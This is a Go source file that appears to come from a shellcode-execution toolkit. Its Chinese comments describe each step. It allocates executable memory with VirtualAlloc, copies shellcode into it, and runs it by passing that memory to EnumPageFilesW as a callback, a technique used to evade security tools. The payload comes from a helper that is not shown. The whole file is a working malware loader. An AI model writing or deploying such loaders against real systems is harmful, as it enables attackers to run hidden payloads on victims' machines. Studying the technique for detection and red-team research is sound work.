package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"fmt"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT = 0x1000
)

func Run(op []byte) {
	// 定义Windows API函数原型
	virtualAlloc := syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualAlloc")
	rtlMoveMemory := syscall.NewLazyDLL("kernel32.dll").NewProc("RtlMoveMemory")
	enumPageFilesW := syscall.NewLazyDLL("psapi.dll").NewProc("EnumPageFilesW")

	// 为shellcode分配内存
	addr, _, err := virtualAlloc.Call(0, uintptr(len(op)), MEM_COMMIT, syscall.PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		fmt.Printf("VirtualAlloc failed: %v\n", err)
		return
	}

	// 将shellcode复制到新分配的内存中
	_, _, err = rtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&op[0])), uintptr(len(op)))
	if err != nil && err != syscall.Errno(0) {
		fmt.Printf("RtlMoveMemory failed: %v\n", err)
		return
	}

	// 调用EnumPageFilesW函数，使用新分配的内存区域作为回调函数
	ret, _, err := enumPageFilesW.Call(uintptr(addr), 0)
	if ret == 0 {
		fmt.Printf("EnumPageFilesW failed: %v\n", err)
		return
	}
}

func main() {
	Run(util.ShellCode())
}
